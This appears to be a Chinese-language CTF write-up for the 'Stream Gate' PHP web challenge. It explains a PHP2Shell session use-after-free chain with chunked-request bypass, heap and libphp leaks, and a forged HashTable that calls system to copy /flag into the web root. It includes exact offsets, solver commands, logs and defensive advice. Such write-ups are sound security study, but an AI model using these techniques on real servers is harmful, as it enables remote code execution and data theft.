# Stream Gate

```
> TPCTF 2026 · web · 挑战 ID `AUTHORED-B6873370` · 状态 solved
```

## 一句话

This import service accepts streamed submissions through its edge server.

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `AUTHORED-B6873370.zip` | 2.0 KB | `c75eabf35786…` |
| `zip/service.Dockerfile` | 299 B | `92e13e10a80c…` |
| `zip/README.txt` | 171 B | `2540fea72373…` |
| `zip/configuration.txt` | 147 B | `c719a8684887…` |
| `zip/php.ini` | 535 B | `880bb8bbf575…` |
| `zip/index.php` | 531 B | `d1ab9607de9c…` |
| `zip/apache.conf` | 533 B | `045c145a4005…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 题面与附件

• 题目：Stream Gate（AUTHORED-B6873370）
• 类型：Web / PHP 8.5.11 + Apache prefork
• 目标：import service 的运行容器里保存着 operator secret，把它取出来
• Flag 格式：«FLAG»

附件只有配置和最小入口，没有完整的 public/ 应用源码：

| 文件 | 内容 |
| --- | --- |
| chal_b6873370/apache.conf | rewrite 规则 + 单 worker prefork 配置 |
| chal_b6873370/php.ini | 8M 内存限制、upload progress、fatal_error_backtraces=On |
| chal_b6873370/service.Dockerfile | FROM php:8.5.11-apache，创建 /e/ 和 /flag 符号链接 |
| chal_b6873370/index.php | 首页，只有 HTML |

容器内关键路径：

/flag -> /answers/flag

/var/www/html/e/     chmod 1777

/var/www/html/e 在 docroot 内且全局可写，是天然的 exfil 目录。

### 关键配置与攻击面

chal_b6873370/apache.conf:3-8：

<Directory /var/www/html>

RewriteEngine On

RewriteCond %{REQUEST_METHOD} =POST

RewriteCond %{HTTP:Content-Length} !^$

RewriteRule ^ - [F]

</Directory>

这会拒绝所有带 Content-Length 的 POST。正常 curl --data 直接 403，因此利用请求必须：

• 用原始 socket 发送；
• 带 Transfer-Encoding: chunked；
• 不能带 Content-Length。

chal_b6873370/apache.conf:10-17 把 prefork 限制为 1 个 worker：

StartServers 1

MinSpareServers 1

MaxSpareServers 1

MaxRequestWorkers 1

ServerLimit 1

MaxConnectionsPerChild 0

单 worker 意味着跨请求的 PHP 进程状态可以保留，这正是 PHP2Shell 链需要的。

chal_b6873370/php.ini 的关键项：

```
memory_limit = 8M                 ; line 6
post_max_size = 64M               ; line 7
max_input_vars = 1000             ; line 10
session.upload_progress.enabled = On
session.upload_progress.cleanup = On
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
fatal_error_backtraces = On       ; line 20
```

这与公开的 php2shell 8M profile 完全一致。fatal_error_backtraces=On 是 PHP 8.5 变体保留 stale-state 的条件之一。

### 漏洞链

核心是 PHP2Shell（CVE-2026-109618 / CVE-2026-109619）：请求启动阶段 OOM/异常退出时，PS(http_session_vars) 等 session 状态没有正确清理，后续请求会复用已经释放的内存。

Stage 0：worker rotation

streamgate_lab/php2shell_exploit.py:371 的 rotate() 先发一个 12MB/2MB 大字段 + 1001 个字段的 multipart，让当前 PHP worker 在请求解析阶段异常退出；Apache prefork 再 fork 一个干净 worker。

Stage 1：泄漏 Zend MM chunk base

streamgate_lab/php2shell_exploit.py:394 的 stage1()：

• A 请求：1001 个 1 字节字段触发 max_input_vars，再加 PHPSESSID=\x00、PHP_SESSION_UPLOAD_PROGRESS、64 字节文件、大字段；
• B 请求：PHPSESSID=attacksessionid0001，加 841 个 48 字节字段，最后一个 79 字节的 forged field。

B 的响应会带一个超长 Set-Cookie，本地是 4096 字节，开头是 L，里面混有 Zend heap 指针。chunk_base_from_cookie()（:306）按 2MB 对齐统计这些指针，取出现次数最多的基址。

Stage 2：泄漏 libphp base

stage2()（:423）：

• A 请求用 1001 个 39 字节字段重新制造 dangling session；
• B 请求发 983 个数组 aNNNN[j]，在 index 406 放 16 个 16 字节值。

一个 56 字节的 HashTable 页会覆盖到 PS(id)+0x18，cookie 的 raw[8:16] 就是 zval_ptr_dtor 指针。libphp_base_from_cookie()（:324）检查低 12 位是否等于 dtor_offset & 0xfff，再 4KB 对齐得到 libphp 基址。

Stage 3：伪造 HashTable 调用 system

_fake_payload()（:449）在 167 字节的 live zend_string 里布置：

• 假 HashTable：gc、nTableMask、arData、nNumUsed、pDestructor = zif_system；
• 假 execute_data：num_args=1，arg1 指向假 zend_string；
• 假 zend_string：长度和命令字节。

stage3()（:494）把这个 167 字节 payload 复制 15 份，用 31 字节字段名和 6 组 (31,31) pad 固定堆位置，再覆盖 PS(http_session_vars)。session 清理时：

zval_ptr_dtor

-> zend_reference_destroy

-> zend_array_destroy

-> zend_hash_destroy

-> pDestructor

-> zif_system(cmd)

命令最多 14 字节。这里用：

```
cat</flag>e/x
```

共 13 字节。Apache/mod_php 的 CWD 是 /var/www/html，所以 e/x 就是 /var/www/html/e/x；cat 重定向会创建 644 文件，随后 GET /e/x 取 flag。

官方 php:8.5.11-apache 镜像常量：

```
zif_system      = 0x5996e0
zval_ptr_dtor   = 0x7b47a0
```

htdata offset   = 0x690d8

```
stage1_n        = 841
stage2_t        = 406
stage2_v        = 16
stage3_pads     = ((31,31),) * 6
stage3_carrier  = True
```

### 本地复现

在 streamgate_lab/ 里用同一基础镜像搭了 replica：

docker build -t streamgate-lab streamgate_lab

docker run -d --name streamgate-lab -p 127.0.0.1:18196:80 streamgate-lab

Dockerfile 做四件事：

1. 把 zz-journal.ini 复制到 /usr/local/etc/php/conf.d/；
2. 把 zz-journal.conf 复制到 /etc/apache2/conf-enabled/；
3. 创建 /var/www/html/e（1777）和测试 flag /answers/flag；
4. 建立 /flag -> /answers/flag。

预检：

py -3 streamgate_lab/remote_probe.py http://127.0.0.1:18196/index.php

期望：

[1] GET            -> 200

[2] POST+CL        -> 403

[3] POST chunked   -> 200

PREFLIGHT OK

本地完整利用：

```
MSYS_NO_PATHCONV=1 py -3 streamgate_lab/solve_streamgate.py --local
```

关键输出：

[+] chunk base = 0x7d2e5c000000

[+] libphp base = 0x7d2e5dc00000

[*] stage 3: HTDATA=0x7d2e5c0690d8 ZIF=0x7d2e5e1996e0

[+] W3 attempt 1

PROOF: «FLAG»

本地测试 flag 是 «FLAG»，不是远端 flag。

本地实现里修的两个坑

1. 指针范围：上游 chunk_base_from_cookie 只接受 0x7f... 原生 Linux 地址，但 Docker Desktop/WSL2 把 Zend heap 映射在 0x77.. / 0x7d..。放宽为任意 canonical 低半区用户态指针：

0x10000 <= value < 0x800000000000

再按 value & ~0x1FFFFF 统计。

2. chunked 传输：Target.post（:220）改成不发 Content-Length，每 256 KiB 发一个 chunk：

<hex-len>\r\n<piece>\r\n

...

0\r\n\r\n

读线程与上传并发，避免 worker 在发送响应后立刻 abort 导致 cookie 丢失。

### 远程实战

实例：

http://{{INSTANCE_HOST}}/

预检通过：

[1] GET            -> 200 len=447

[2] POST+CL        -> 403 len=331

[3] POST chunked   -> 200 len=664

PREFLIGHT OK

第一个坑：不能打 /index.php

直接对 /index.php 跑完整 solver，stage1 连续 4 次失败：

[-] heap leak missed

...

HEAP_LEAK_FAILED

调试发现：

• A 请求返回 200，带预期的 max_input_vars 警告；
• B 请求只返回一个普通的 32 位 PHPSESSID，没有本地那种 4096 字节超长 cookie。

也就是说，远端部署的 /index.php 会初始化 session/改变堆状态，把 stage1 依赖的 dangling session 覆盖掉。附件里的 10 行 index.php 只是最小入口，实际部署的 index 显然多了 bootstrap 逻辑。

改用纯静态的 /healthz.php 后，stage1 连续两次拿到超长 cookie：

Set-Cookie: PHPSESSID=LAAAA...   (4096 字节)

chunk base = 0x76f905a00000

第二个坑：远端 12 MiB 字段不稳定

换 /healthz.php 后，默认 --huge-mb 12 仍然 stage1 4/4 失败；但调试脚本用 2 MiB 时 2/2 成功。说明远端 ingress 对 12 MiB 的字段转发不稳定（可能截断或超时），改用：

--huge-mb 2

第三个坑：Git Bash 路径转换

本地 fresh lab 上曾出现 stage3 “没有 proof”，但 Apache 日志显示：

"GET E:/x HTTP/1.1" 400

原因是 Git Bash/MSYS 把 --fetch /e/x 参数改写成了 Windows 路径 E:/x。solver 最后请求的是 E:/x 而不是 /e/x，所以读不到已经写好的文件。解决：

```
MSYS_NO_PATHCONV=1 py -3 ...
```

PowerShell 不会做这个改写。

最终成功

[*] target http://{{INSTANCE_HOST}}/healthz.php (cmd='cat</flag>e/x')

[*] offsets: zif=0x5996e0 dtor=0x7b47a0 htdata=0x690d8

[*] stage 1: heap leak (attempt 3/4)

[+] chunk base = 0x76f905a00000

[*] stage 2: libphp leak (attempt 1/4)

[+] libphp base = 0x76f907600000

[*] stage 3: HTDATA=0x76f905a690d8 ZIF=0x76f907b996e0

[+] W3 attempt 1

PROOF: «FLAG»

/e/x 二次确认：

```bash
curl -i http://{{INSTANCE_HOST}}/e/x
```

HTTP/1.1 200 OK

Content-Length: 38

«FLAG»

### 结果

«FLAG»

### 复现命令

```
MSYS_NO_PATHCONV=1 py -3 streamgate_lab/solve_streamgate.py \
```

-u http://{{INSTANCE_HOST}}/healthz.php \

--no-auto-offsets \

--zif-offset 0x5996e0 \

--dtor-offset 0x7b47a0 \

--htdata-offset 0x690d8 \

--huge-mb 2 \

--cmd 'cat</flag>e/x' \

--fetch /e/x \

--retries 4 --timeout 120

关键点：

• 目标用 /healthz.php，不要用 /index.php；
• 远端用 --huge-mb 2；
• stage1 有概率性，保留 4 次左右重试；
• worker abort（zend_mm_heap corrupted、signal 6/11）是正常现象；
• Git Bash 必须加 MSYS_NO_PATHCONV=1。

### 防御建议

• 升级到已修复 PHP2Shell 的 PHP 版本，避免 PS(http_session_vars) 在异常请求启动后残留；
• 关闭不必要的 session.upload_progress，或至少在请求异常路径中显式清理；
• 不要开启 fatal_error_backtraces 于生产环境；
• 不要把可写的导出目录放在 docroot 内，更不要给 1777 权限；
• 单 worker prefork 会把跨请求状态问题放大，Web 进程应按请求隔离。

### 附件与脚本

• streamgate_lab/STEPS.md：本地/远程操作清单
• streamgate_lab/php2shell_exploit.py：chunked 传输、放宽后的泄漏解析器、官方 8.5.11 profile
• streamgate_lab/solve_streamgate.py：命令行入口
• streamgate_lab/remote_probe.py：入口预检
• _dl/streamgate_remote_healthz_h2.log：最终成功日志

## 结果

- flag sha256：`12133a88d15ac696306bd2e4cbd660cd831afdccfe27c4e434da4a975e6dca8f`, `1716cf69dbeae554ba1e73e63515ff96b18e994469ac9fb0a2bd3140bef9d828`, `b0a7a15a39aeee74fc8ddda76dab947b4777ecec84bfcf4de5a4b54df8d0e87b`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- `solve/php2shell_exploit.py`

## 待核实

- 本条目由 WP 第 2 节《Stream Gate》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
